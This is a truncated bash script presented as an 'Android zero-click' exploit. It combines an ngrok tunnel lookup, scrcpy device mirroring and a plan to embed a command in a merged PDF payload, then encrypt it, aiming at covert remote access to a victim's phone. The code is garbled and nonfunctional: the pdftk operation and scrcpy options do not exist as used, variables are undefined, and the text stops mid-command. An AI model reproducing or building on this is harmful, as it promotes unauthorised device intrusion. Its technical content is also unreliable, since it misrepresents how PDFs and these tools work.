#!/bin/bash
echo "
█████╗ ███╗  ██╗██████╗ ██████╗ ██████╗ ██╗██████╗   ███████╗ ██████╗██████╗   ███████╗███████╗██████╗ ██████╗ ██████╗██╗   ██╗ ██████╗██╗ ██╗
██╔══██╗████╗ ██║██╔══██╗██╔══██╗██╔═══██║██║██╔══██╗  ██╔════╝██╔════╝██╔══██╗  ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝██║   ██║██╔════╝██║ ██╔╝
███████║██╔██╗ ██║██║ ██║██████╔╝██║  ██║██║██║ ██║  █████╗ ██║   ██████╔╝   ███╔╝ █████╗ ██████╔╝██║  ██║██║   ██║   ██║██║   █████╔╝ 
██╔══██║██║╚██╗██║██║ ██║██╔══██╗██║  ██║██║██║ ██║  ██╔══╝ ██║   ██╔═══╝   ███╔╝ ██╔══╝ ██╔══██╗██║  ██║██║   ██║   ██║██║   ██╔═██╗ 
██║ ██║██║ ╚████║██████╔╝██║ ██║╚██████╔╝██║██████╔╝  ██║   ╚██████╗██║     ███████╗███████╗██║ ██║╚██████╔╝╚██████╗███████╗██║╚██████╗██║ ██╗
╚═╝ ╚═╝╚═╝ ╚═══╝╚═════╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝╚═════╝   ╚═╝   ╚═════╝╚═╝     ╚══════╝╚══════╝╚═╝ ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚═╝ ╚═════╝╚═╝ ╚═╝
"
figlet -c purple "ANDROID FCP-Zeroclick"
# Variables
NGROK_TUNNEL_URL=$(ngrok status | grep "Forwarding" | awk '{print $2}')
COMMAND_FILE="/tmp/command.txt"
FRAGMENTED_PDF_PAYLOAD="/tmp/fragmented_pdf_payload"

Functions
function mirror_android_device() {
 # Get the IP address of the Android device
 android_device_ip="$1"

# Start a scrcpy session with the Android device
 scrcpy -d "$android_device_ip" --background --auto-connect yes
}

function generate_pdf_payload() {
 # Combine the two PDF files into one
 pdftk "$pdf_file_1" "$pdf_file_2" output "$pdf_payload"

# Add the scrcpy command to the PDF payload
 pdftk "$pdf_payload" insert "scrcpy -d $(get_device_id) --background --auto-connect yes" output "$pdf_payload"
}

function encrypt_pdf_payload() {
 openssl aes-2
